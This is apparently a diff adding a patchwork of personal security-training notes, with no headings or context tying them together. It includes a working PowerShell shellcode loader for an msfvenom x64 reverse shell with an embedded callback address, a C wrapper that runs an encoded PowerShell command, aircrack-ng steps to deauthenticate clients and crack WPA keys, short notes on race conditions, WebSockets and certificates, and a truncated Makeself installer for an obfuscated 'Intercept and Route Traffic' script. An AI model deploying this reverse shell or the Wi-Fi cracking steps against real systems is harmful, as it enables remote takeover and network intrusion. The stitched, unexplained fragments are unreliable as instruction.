@@ -1,0 +1,913 @@
+host.hostname
+user.name
+event.category
+process.command_line
+event.outcome
+source.ip
+
+
+cerebrascoder -- mbu generates codes instantly ...
+
+void registryCheck() {
+// Encoded PowerShell command to query the registry
+    const char *encodedCommand = "RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACIAIAAtAE4AYQBtAGUAIABQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBEAGkAcgA=";
+    // Prepare the PowerShell execution command
+    char command[512];
+    snprintf(command, sizeof(command), "powershell -EncodedCommand %s", encodedCommand);
+
+    // Run the command
+    int result = system(command);
+
+    // Check for successful execution
+    if (result == 0) {
+        printf("Registry query executed successfully.\n");
+    } else {
+        fprintf(stderr, "Failed to execute registry query.\n");
+    }
+}
+
+:DAY 6
+
+
+DAY 8: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f powershell:
+
+$VrtAlloc = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+"@
+
+Add-Type $VrtAlloc
+
+$WaitFor= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $WaitFor
+
+$CrtThread= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+}
+"@
+Add-Type $CrtThread
+
+[Byte[]] $buf = $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xa,0xa,0x32,0x23,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+
+DAY 10: /home/lukewago/.msf4/local/
+
+DAY 11:  iw dev
+sudo iw dev wlan2 scan
+sudo iw dev wlan2 info
+sudo ip link set dev wlan2 down
+sudo iw dev wlan2 set type monitor
+sudo ip link set dev wlan2 up
+-------------------------------------------------
+sudo airodump-ng wlan2
+sudo airodump-ng -c 6 --bssid NUMBER -w file wlan2
+sudo aireplay-ng -0 1 -a BSSID -c BSSID wlan2
+sudo aircrack-ng -a 2 -b BSSID -w WORDLIST(rockyou.txt) file.cap
+-------------------------------------------------
+wpa_passphrase WI-FI 'ENTER PSK' > config
+sudo wpa_supplicant -B -c config -i wlan2
+
+DAY 12:
+Use Atomic Transactions: The developer should have implemented atomic database transactions to ensure that all steps of a fund transfer (deducting and crediting balances) are performed as a single unit. This would ensure that either all steps of the transaction succeed or none do, preventing partial updates that could lead to an inconsistent state.
+Implement Mutex Locks: By using Mutex Locks, the developer could have ensured that only one thread accesses the shared resource (such as the account balance) at a time. This would prevent multiple requests from interfering with each other during concurrent transactions.
+Apply Rate Limits: The developer should have implemented rate limiting on critical functions like funds transfers and withdrawals. This would limit the number of requests processed within a specific time frame, reducing the risk of abuse through rapid, repeated requests.
+
+DAY 13:
+WebSocket Vulnerabilities
+
+While WebSockets can boost performance, they also come with security risks that developers need to monitor. Since WebSocket connections stay open and active, they can be taken advantage of if the proper security measures aren't in place. Here are some common vulnerabilities:
+
+    Weak Authentication and Authorisation: Unlike regular HTTP, WebSockets don't have built-in ways to handle user authentication or session validation. If you don't set these controls up properly, attackers could slip in and get access to sensitive data or mess with the connection.
+    Message Tampering: WebSockets let data flow back and forth constantly, which means attackers could intercept and change messages if encryption isn't used. This could allow them to inject harmful commands, perform actions they shouldn't, or mess with the sent data.
+    Cross-Site WebSocket Hijacking (CSWSH): This happens when an attacker tricks a user's browser into opening a WebSocket connection to another site. If successful, the attacker might be able to hijack that connection or access data meant for the legitimate server.
+    Denial of Service (DoS): Because WebSocket connections stay open, they can be targeted by DoS attacks. An attacker could flood the server with a ton of messages, potentially slowing it down or crashing it altogether.
+
+DAY 14: Certificate Mismanagement:
+what a certificate is:
+
+    Public key: At its core, a certificate contains a public key, part of a pair of cryptographic keys: a public key and a private key. The public key is made available to anyone and is used to encrypt data.
+    Private key: The private key remains secret and is used by the website or server to decrypt the data.
+    Metadata: Along with the key, it includes metadata that provides additional information about the certificate holder (the website) and the certificate. You usually find information about the Certificate Authority (CA), subject (information about the website, e.g. www.meow.thm), a uniquely identifiable number, validity period, signature, and hashing algorithm.
+
+Sign Here, Trust Me
+
+So what is a Certificate Authority (CA)?
+
+A CA is a trusted entity that issues certificates; for example, GlobalSign, Let’s Encrypt, and DigiCert are very common ones. The browser trusts these entities and performs a series of checks to ensure it is a trusted CA. Here is a breakdown of what happens with a certificate:
+
+    Handshake: Your browser requests a secure connection, and the website responds by sending a certificate, but in this case, it only requires the public key and metadata.
+    Verification: Your browser checks the certificate for its validity by checking if it was issued by a trusted CA. If the certificate hasn’t expired or been tampered with, and the CA is trusted, then the browser gives the green light. There are different types of checks you can do; check them here.
+    Key exchange: The browser uses the public key to encrypt a session key, which encrypts all communications between the browser and the website.
+    Decryption: The website (server) uses its private key to decrypt the session key, which is symmetric. Now that both the browser and the website share a secret key (session key), we have established a secure and encrypted communication!
+
+Ever wonder what makes HTTPS be S (secure)? Thanks to certificates, we can now have authentication, encryption, and data integrity.
+
+Self-Signed Certificates vs. Trusted CA Certificates
+
+The process of acquiring a certificate with a CA is long, you create the certificate, and send it to a CA to sign it for you. If you don’t have tools and automation in place, this process can take weeks. Self-signed certificates are signed by an entity usually the same one that authenticates. For example, Wareville owns the GiftScheduler site, and if they create a certificate and sign it with Wareville as a CA, that becomes a self-signed certificate.
+
+    Browsers generally do not trust self-signed certificates because there is no third-party verification. The browser has no way of knowing if the certificate is authentic or if it’s being used for malicious purposes (like a man-in-the-middle attack).
+    Trusted CA certificates, on the other hand, are verified by a CA, which acts as a trusted third party to confirm the website’s identity.
+
+CA-issued certificates sometimes take a long time; if you want to test a development environment, it can make sense to use self-signed certificates. Ideally, this is an internal, air-gapped environment with no connection to the public Internet. Otherwise, it defeats the purpose of a certificate: the entire system of secure communication relies on the fact that both parties (the browser and the server) can trust the data being exchanged and that no one in the middle can intercept or modify it without detection.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#!/bin/sh
+# This script was generated using Makeself 2.5.0
+# The license covering this archive and its contents, if any, is wholly independent of the Makeself license (GPL)
+
+ORIG_UMASK=`umask`
+if test "n" = n; then
+    umask 077
+fi
+
+CRCsum="3777670078"
+MD5="78a3283d19dab5f4db41be621891bfca"
+SHA="0000000000000000000000000000000000000000000000000000000000000000"
+SIGNATURE=""
+TMPROOT=${TMPDIR:=/tmp}
+USER_PWD="$PWD"
+export USER_PWD
+ARCHIVE_DIR=`dirname "$0"`
+export ARCHIVE_DIR
+
+label="Intercept and Route Traffic"
+script="./route-elf-traffic.sh"
+scriptargs=""
+cleanup_script=""
+licensetxt=""
+helpheader=""
+preextract=""
+targetdir="obfuscated"
+filesizes="736"
+totalsize="736"
+keep="n"
+nooverwrite="n"
+quiet="n"
+accept="n"
+nodiskspace="n"
+export_conf="n"
+decrypt_cmd=""
+skip="758"
+
+print_cmd_arg=""
+if type printf > /dev/null; then
+    print_cmd="printf"
+elif test -x /usr/ucb/echo; then
+    print_cmd="/usr/ucb/echo"
+else
+    print_cmd="echo"
+fi
+
+if test -d /usr/xpg4/bin; then
+    PATH=/usr/xpg4/bin:$PATH
+    export PATH
+fi
+
+if test -d /usr/sfw/bin; then
+    PATH=$PATH:/usr/sfw/bin
+    export PATH
+fi
+
+unset CDPATH
+
+MS_Printf()
+{
+    $print_cmd $print_cmd_arg "$1"
+}
+
+MS_PrintLicense()
+{
+  PAGER=${PAGER:=more}
+  if test x"$licensetxt" != x; then
+    PAGER_PATH=`exec <&- 2>&-; which $PAGER || command -v $PAGER || type $PAGER`
+    if test -x "$PAGER_PATH" && test x"$accept" != xy; then
+      if ! echo "$licensetxt" | $PAGER -e; then
+        echo "$licensetxt" | $PAGER
+      fi
+    else
+      echo "$licensetxt"
+    fi
+    if test x"$accept" != xy; then
+      while true
+      do
+        MS_Printf "Please type y to accept, n otherwise: "
+        read yn
+        if test x"$yn" = xn; then
+          keep=n
+          eval $finish; exit 1
+          break;
+        elif test x"$yn" = xy; then
+          break;
+        fi
+      done
+    fi
+  fi
+}
+
+MS_diskspace()
+{
+	(
+	df -k "$1" | tail -1 | awk '{ if ($4 ~ /%/) {print $3} else {print $4} }'
+	)
+}
+
+MS_dd()
+{
+    blocks=`expr $3 / 1024`
+    bytes=`expr $3 % 1024`
+    # Test for ibs, obs and conv feature
+    if dd if=/dev/zero of=/dev/null count=1 ibs=512 obs=512 conv=sync 2> /dev/null; then
+        dd if="$1" ibs=$2 skip=1 obs=1024 conv=sync 2> /dev/null | \
+        { test $blocks -gt 0 && dd ibs=1024 obs=1024 count=$blocks ; \
+          test $bytes  -gt 0 && dd ibs=1 obs=1024 count=$bytes ; } 2> /dev/null
+    else
+        dd if="$1" bs=$2 skip=1 2> /dev/null
+    fi
+}
+
+MS_dd_Progress()
+{
+    if test x"$noprogress" = xy; then
+        MS_dd "$@"
+        return $?
+    fi
+    file="$1"
+    offset=$2
+    length=$3
+    pos=0
+    bsize=4194304
+    while test $bsize -gt $length; do
+        bsize=`expr $bsize / 4`
+    done
+    blocks=`expr $length / $bsize`
+    bytes=`expr $length % $bsize`
+    (
+        dd ibs=$offset skip=1 count=1 2>/dev/null
+        pos=`expr $pos \+ $bsize`
+        MS_Printf "     0%% " 1>&2
+        if test $blocks -gt 0; then
+            while test $pos -le $length; do
+                dd bs=$bsize count=1 2>/dev/null
+                pcent=`expr $length / 100`
+                pcent=`expr $pos / $pcent`
+                if test $pcent -lt 100; then
+                    MS_Printf "\b\b\b\b\b\b\b" 1>&2
+                    if test $pcent -lt 10; then
+                        MS_Printf "    $pcent%% " 1>&2
+                    else
+                        MS_Printf "   $pcent%% " 1>&2
+                    fi
+                fi
+                pos=`expr $pos \+ $bsize`
+            done
+        fi
+        if test $bytes -gt 0; then
+            dd bs=$bytes count=1 2>/dev/null
+        fi
+        MS_Printf "\b\b\b\b\b\b\b" 1>&2
+        MS_Printf " 100%%  " 1>&2
+    ) < "$file"
+}
+
+MS_Help()
+{
+    cat << EOH >&2
+Makeself version 2.5.0
+ 1) Getting help or info about $0 :
+  $0 --help   Print this message
+  $0 --info   Print embedded info : title, default target directory, embedded script ...
+  $0 --lsm    Print embedded lsm entry (or no LSM)
+  $0 --list   Print the list of files in the archive
+  $0 --check  Checks integrity of the archive
+  $0 --verify-sig key Verify signature against a provided key id
+  $0 --show-preextract Print pre-extraction script
+
+ 2) Running $0 :
+  $0 [options] [--] [additional arguments to embedded script]
+  with following options (in that order)
+  --confirm             Ask before running embedded script
+  --quiet               Do not print anything except error messages
+  --accept              Accept the license
+  --noexec              Do not run embedded script (implies --noexec-cleanup)
+  --noexec-cleanup      Do not run embedded cleanup script
+  --keep                Do not erase target directory after running
+                        the embedded script
+  --noprogress          Do not show the progress during the decompression
+  --nox11               Do not spawn an xterm
+  --nochown             Do not give the target folder to the current user
+  --chown               Give the target folder to the current user recursively
+  --nodiskspace         Do not check for available disk space
+  --target dir          Extract directly to a target directory (absolute or relative)
+                        This directory may undergo recursive chown (see --nochown).
+  --tar arg1 [arg2 ...] Access the contents of the archive through the tar command
+  --ssl-pass-src src    Use the given src as the source of password to decrypt the data
+                        using OpenSSL. See "PASS PHRASE ARGUMENTS" in man openssl.
+                        Default is to prompt the user to enter decryption password
+                        on the current terminal.
+  --cleanup-args args   Arguments to the cleanup script. Wrap in quotes to provide
+                        multiple arguments.
+  --                    Following arguments will be passed to the embedded script${helpheader}
+
+  ENVIRONMENT
+      SETUP_NOCHECK
+          If set to 1, then checksum validation will be skipped.
+EOH
+}
+
+MS_Verify_Sig()
+{
+    GPG_PATH=`exec <&- 2>&-; which gpg || command -v gpg || type gpg`
+    MKTEMP_PATH=`exec <&- 2>&-; which mktemp || command -v mktemp || type mktemp`
+    test -x "$GPG_PATH" || GPG_PATH=`exec <&- 2>&-; which gpg || command -v gpg || type gpg`
+    test -x "$MKTEMP_PATH" || MKTEMP_PATH=`exec <&- 2>&-; which mktemp || command -v mktemp || type mktemp`
+	offset=`head -n "$skip" "$1" | wc -c | sed "s/ //g"`
+    temp_sig=`mktemp -t XXXXX`
+    echo $SIGNATURE | base64 --decode > "$temp_sig"
+    gpg_output=`MS_dd "$1" $offset $totalsize | LC_ALL=C "$GPG_PATH" --verify "$temp_sig" - 2>&1`
+    gpg_res=$?
+    rm -f "$temp_sig"
+    if test $gpg_res -eq 0 && test `echo $gpg_output | grep -c Good` -eq 1; then
+        if test `echo $gpg_output | grep -c $sig_key` -eq 1; then
+            test x"$quiet" = xn && echo "GPG signature is good" >&2
+        else
+            echo "GPG Signature key does not match" >&2
+            exit 2
+        fi
+    else
+        test x"$quiet" = xn && echo "GPG signature failed to verify" >&2
+        exit 2
+    fi
+}
+
+MS_Check()
+{
+    OLD_PATH="$PATH"
+    PATH=${GUESS_MD5_PATH:-"$OLD_PATH:/bin:/usr/bin:/sbin:/usr/local/ssl/bin:/usr/local/bin:/opt/openssl/bin"}
+	MD5_ARG=""
+    MD5_PATH=`exec <&- 2>&-; which md5sum || command -v md5sum || type md5sum`
+    test -x "$MD5_PATH" || MD5_PATH=`exec <&- 2>&-; which md5 || command -v md5 || type md5`
+    test -x "$MD5_PATH" || MD5_PATH=`exec <&- 2>&-; which digest || command -v digest || type digest`
+    PATH="$OLD_PATH"
+
+    SHA_PATH=`exec <&- 2>&-; which shasum || command -v shasum || type shasum`
+    test -x "$SHA_PATH" || SHA_PATH=`exec <&- 2>&-; which sha256sum || command -v sha256sum || type sha256sum`
+
+    if test x"$quiet" = xn; then
+		MS_Printf "Verifying archive integrity..."
+    fi
+    offset=`head -n "$skip" "$1" | wc -c | sed "s/ //g"`
+    fsize=`cat "$1" | wc -c | sed "s/ //g"`
+    if test $totalsize -ne `expr $fsize - $offset`; then
+        echo " Unexpected archive size." >&2
+        exit 2
+    fi
+    verb=$2
+    i=1
+    for s in $filesizes
+    do
+		crc=`echo $CRCsum | cut -d" " -f$i`
+		if test -x "$SHA_PATH"; then
+			if test x"`basename $SHA_PATH`" = xshasum; then
+				SHA_ARG="-a 256"
+			fi
+			sha=`echo $SHA | cut -d" " -f$i`
+			if test x"$sha" = x0000000000000000000000000000000000000000000000000000000000000000; then
+				test x"$verb" = xy && echo " $1 does not contain an embedded SHA256 checksum." >&2
+			else
+				shasum=`MS_dd_Progress "$1" $offset $s | eval "$SHA_PATH $SHA_ARG" | cut -b-64`;
+				if test x"$shasum" != x"$sha"; then
+					echo "Error in SHA256 checksums: $shasum is different from $sha" >&2
+					exit 2
+				elif test x"$quiet" = xn; then
+					MS_Printf " SHA256 checksums are OK."
+				fi
+				crc="0000000000";
+			fi
+		fi
+		if test -x "$MD5_PATH"; then
+			if test x"`basename $MD5_PATH`" = xdigest; then
+				MD5_ARG="-a md5"
+			fi
+			md5=`echo $MD5 | cut -d" " -f$i`
+			if test x"$md5" = x00000000000000000000000000000000; then
+				test x"$verb" = xy && echo " $1 does not contain an embedded MD5 checksum." >&2
+			else
+				md5sum=`MS_dd_Progress "$1" $offset $s | eval "$MD5_PATH $MD5_ARG" | cut -b-32`;
+				if test x"$md5sum" != x"$md5"; then
+					echo "Error in MD5 checksums: $md5sum is different from $md5" >&2
+					exit 2
+				elif test x"$quiet" = xn; then
+					MS_Printf " MD5 checksums are OK."
+				fi
+				crc="0000000000"; verb=n
+			fi
+		fi
+		if test x"$crc" = x0000000000; then
+			test x"$verb" = xy && echo " $1 does not contain a CRC checksum." >&2
+		else
+			sum1=`MS_dd_Progress "$1" $offset $s | CMD_ENV=xpg4 cksum | awk '{print $1}'`
+			if test x"$sum1" != x"$crc"; then
+				echo "Error in checksums: $sum1 is different from $crc" >&2
+				exit 2
+			elif test x"$quiet" = xn; then
+				MS_Printf " CRC checksums are OK."
+			fi
+		fi
+		i=`expr $i + 1`
+		offset=`expr $offset + $s`
+    done
+    if test x"$quiet" = xn; then
+		echo " All good."
+    fi
+}
+
+MS_Preextract()
+{
+    if test -z "$preextract"; then
+        return
+    elif test x"$verbose" = xy; then
+        MS_Printf "About to run pre-extraction script ... Proceed ? [Y/n] "
+        read yn
+        if test x"$yn" = xn; then
+            eval $finish; exit 1
+        fi
+    fi
+
+    prescript=`mktemp "$tmpdir/XXXXXX"`
+    echo "$preextract" | base64 -d > "$prescript"
+    chmod a+x "$prescript"
+
+    (cd "$tmpdir"; eval "\"$prescript\" $scriptargs \"\$@\""); res=$?
+
+    rm -f "$prescript"
+    if test $res -ne 0; then
+        echo "Pre-extraction script returned an error code ($res)" >&2
+        eval $finish; exit 1
+    fi
+}
+
+MS_Decompress()
+{
+    if test x"$decrypt_cmd" != x""; then
+        { eval "$decrypt_cmd" || echo " ... Decryption failed." >&2; } | eval "gzip -cd"
+    else
+        eval "gzip -cd"
+    fi
+
+    if test $? -ne 0; then
+        echo " ... Decompression failed." >&2
+    fi
+}
+
+UnTAR()
+{
+    if test x"$quiet" = xn; then
+		tar $1vf -  2>&1 || { echo " ... Extraction failed." >&2; kill -15 $$; }
+    else
+		tar $1f -  2>&1 || { echo Extraction failed. >&2; kill -15 $$; }
+    fi
+}
+
+MS_exec_cleanup() {
+    if test x"$cleanup" = xy && test x"$cleanup_script" != x""; then
+        cleanup=n
+        cd "$tmpdir"
+        eval "\"$cleanup_script\" $scriptargs $cleanupargs"
+    fi
+}
+
+MS_cleanup()
+{
+    echo 'Signal caught, cleaning up' >&2
+    MS_exec_cleanup
+    cd "$TMPROOT"
+    rm -rf "$tmpdir"
+    eval $finish; exit 15
+}
+
+finish=true
+xterm_loop=
+noprogress=n
+nox11=n
+copy=none
+ownership=n
+verbose=n
+cleanup=y
+cleanupargs=
+sig_key=
+
+initargs="$@"
+
+while true
+do
+    case "$1" in
+    -h | --help)
+	MS_Help
+	exit 0
+	;;
+    -q | --quiet)
+	quiet=y
+	noprogress=y
+	shift
+	;;
+	--accept)
+	accept=y
+	shift
+	;;
+    --info)
+	echo Identification: "$label"
+	echo Target directory: "$targetdir"
+	echo Uncompressed size: 12 KB
+	echo Compression: gzip
+	if test x"n" != x""; then
+	    echo Encryption: n
+	fi
+	echo Date of packaging: Wed Nov 20 09:32:49 +03 2024
+	echo Built with Makeself version 2.5.0
+	echo Build command was: "./makeself.sh \\
+    \"./obfuscated\" \\
+    \"route-elf-traffic_obf.sh\" \\
+    \"Intercept and Route Traffic\" \\
+    \"./route-elf-traffic.sh\""
+	if test x"$script" != x; then
+	    echo Script run after extraction:
+	    echo "    " $script $scriptargs
+	fi
+	if test x"" = xcopy; then
+		echo "Archive will copy itself to a temporary location"
+	fi
+	if test x"n" = xy; then
+		echo "Root permissions required for extraction"
+	fi
+	if test x"n" = xy; then
+	    echo "directory $targetdir is permanent"
+	else
+	    echo "$targetdir will be removed after extraction"
+	fi
+	exit 0
+	;;
+    --dumpconf)
+	echo LABEL=\"$label\"
+	echo SCRIPT=\"$script\"
+	echo SCRIPTARGS=\"$scriptargs\"
+    echo CLEANUPSCRIPT=\"$cleanup_script\"
+	echo archdirname=\"obfuscated\"
+	echo KEEP=n
+	echo NOOVERWRITE=n
+	echo COMPRESS=gzip
+	echo filesizes=\"$filesizes\"
+    echo totalsize=\"$totalsize\"
+	echo CRCsum=\"$CRCsum\"
+	echo MD5sum=\"$MD5sum\"
+	echo SHAsum=\"$SHAsum\"
+	echo SKIP=\"$skip\"
+	exit 0
+	;;
+    --lsm)
+cat << EOLSM
+No LSM.
+EOLSM
+	exit 0
+	;;
+    --list)
+	echo Target directory: $targetdir
+	offset=`head -n "$skip" "$0" | wc -c | sed "s/ //g"`
+	for s in $filesizes
+	do
+	    MS_dd "$0" $offset $s | MS_Decompress | UnTAR t
+	    offset=`expr $offset + $s`
+	done
+	exit 0
+	;;
+	--tar)
+	offset=`head -n "$skip" "$0" | wc -c | sed "s/ //g"`
+	arg1="$2"
+    shift 2 || { MS_Help; exit 1; }
+	for s in $filesizes
+	do
+	    MS_dd "$0" $offset $s | MS_Decompress | tar "$arg1" - "$@"
+	    offset=`expr $offset + $s`
+	done
+	exit 0
+	;;
+    --check)
+	MS_Check "$0" y
+	exit 0
+	;;
+    --verify-sig)
+    sig_key="$2"
+    shift 2 || { MS_Help; exit 1; }
+    MS_Verify_Sig "$0"
+    ;;
+    --show-preextract)
+    if test -z "$preextract"; then
+        echo "Pre-extraction script is not provided." >&2
+        exit 1
+    fi
+    echo "$preextract" | base64 -d
+    exit 0
+    ;;
+    --confirm)
+	verbose=y
+	shift
+	;;
+	--noexec)
+	script=""
+    cleanup_script=""
+    preextract=""
+	shift
+	;;
+    --noexec-cleanup)
+    cleanup_script=""
+    shift
+    ;;
+    --keep)
+	keep=y
+	shift
+	;;
+    --target)
+	keep=y
+	targetdir="${2:-.}"
+    shift 2 || { MS_Help; exit 1; }
+	;;
+    --noprogress)
+	noprogress=y
+	shift
+	;;
+    --nox11)
+	nox11=y
+	shift
+	;;
+    --nochown)
+	ownership=n
+	shift
+	;;
+    --chown)
+        ownership=y
+        shift
+        ;;
+    --nodiskspace)
+	nodiskspace=y
+	shift
+	;;
+    --xwin)
+	if test "n" = n; then
+		finish="echo Press Return to close this window...; read junk"
+	fi
+	xterm_loop=1
+	shift
+	;;
+    --phase2)
+	copy=phase2
+	shift
+	;;
+	--ssl-pass-src)
+	if test x"n" != x"openssl"; then
+	    echo "Invalid option --ssl-pass-src: $0 was not encrypted with OpenSSL!" >&2
+	    exit 1
+	fi
+	decrypt_cmd="$decrypt_cmd -pass $2"
+    shift 2 || { MS_Help; exit 1; }
+	;;
+    --cleanup-args)
+    cleanupargs="$2"
+    shift 2 || { MS_Help; exit 1; }
+    ;;
+    --)
+	shift
+	break ;;
+    -*)
+	echo Unrecognized flag : "$1" >&2
+	MS_Help
+	exit 1
+	;;
+    *)
+	break ;;
+    esac
+done
+
+if test x"$quiet" = xy -a x"$verbose" = xy; then
+	echo Cannot be verbose and quiet at the same time. >&2
+	exit 1
+fi
+
+if test x"n" = xy -a `id -u` -ne 0; then
+	echo "Administrative privileges required for this archive (use su or sudo)" >&2
+	exit 1
+fi
+
+if test x"$copy" \!= xphase2; then
+    MS_PrintLicense
+fi
+
+case "$copy" in
+copy)
+    tmpdir="$TMPROOT"/makeself.$RANDOM.`date +"%y%m%d%H%M%S"`.$$
+    mkdir "$tmpdir" || {
+	echo "Could not create temporary directory $tmpdir" >&2
+	exit 1
+    }
+    SCRIPT_COPY="$tmpdir/makeself"
+    echo "Copying to a temporary location..." >&2
+    cp "$0" "$SCRIPT_COPY"
+    chmod +x "$SCRIPT_COPY"
+    cd "$TMPROOT"
+    export USER_PWD="$tmpdir"
+    exec "$SCRIPT_COPY" --phase2 -- $initargs
+    ;;
+phase2)
+    finish="$finish ; rm -rf `dirname $0`"
+    ;;
+esac
+
+if test x"$nox11" = xn; then
+    if test -t 1; then  # Do we have a terminal on stdout?
+	:
+    else
+        if test x"$DISPLAY" != x -a x"$xterm_loop" = x; then  # No, but do we have X?
+            if xset q > /dev/null 2>&1; then # Check for valid DISPLAY variable
+                GUESS_XTERMS="xterm gnome-terminal rxvt dtterm eterm Eterm xfce4-terminal lxterminal kvt konsole aterm terminology"
+                for a in $GUESS_XTERMS; do
+                    if type $a >/dev/null 2>&1; then
+                        XTERM=$a
+                        break
+                    fi
+                done
+                chmod a+x $0 || echo Please add execution rights on $0 >&2
+                if test `echo "$0" | cut -c1` = "/"; then # Spawn a terminal!
+                    exec $XTERM -e "$0 --xwin $initargs"
+                else
+                    exec $XTERM -e "./$0 --xwin $initargs"
+                fi
+            fi
+        fi
+    fi
+fi
+
+if test x"$targetdir" = x.; then
+    tmpdir="."
+else
+    if test x"$keep" = xy; then
+	if test x"$nooverwrite" = xy && test -d "$targetdir"; then
+            echo "Target directory $targetdir already exists, aborting." >&2
+            exit 1
+	fi
+	if test x"$quiet" = xn; then
+	    echo "Creating directory $targetdir" >&2
+	fi
+	tmpdir="$targetdir"
+	dashp="-p"
+    else
+	tmpdir="$TMPROOT/selfgz$$$RANDOM"
+	dashp=""
+    fi
+    mkdir $dashp "$tmpdir" || {
+	echo 'Cannot create target directory' $tmpdir >&2
+	echo 'You should try option --target dir' >&2
+	eval $finish
+	exit 1
+    }
+fi
+
+location="`pwd`"
+if test x"$SETUP_NOCHECK" != x1; then
+    MS_Check "$0"
+fi
+offset=`head -n "$skip" "$0" | wc -c | sed "s/ //g"`
+
+MS_Preextract "$@"
+
+if test x"$verbose" = xy; then
+	MS_Printf "About to extract 12 KB in $tmpdir ... Proceed ? [Y/n] "
+	read yn
+	if test x"$yn" = xn; then
+		eval $finish; exit 1
+	fi
+fi
+
+if test x"$quiet" = xn; then
+    # Decrypting with openssl will ask for password,
+    # the prompt needs to start on new line
+	if test x"n" = x"openssl"; then
+	    echo "Decrypting and uncompressing $label..."
+	else
+        MS_Printf "Uncompressing $label"
+	fi
+fi
+res=3
+if test x"$keep" = xn; then
+    trap MS_cleanup 1 2 3 15
+fi
+
+if test x"$nodiskspace" = xn; then
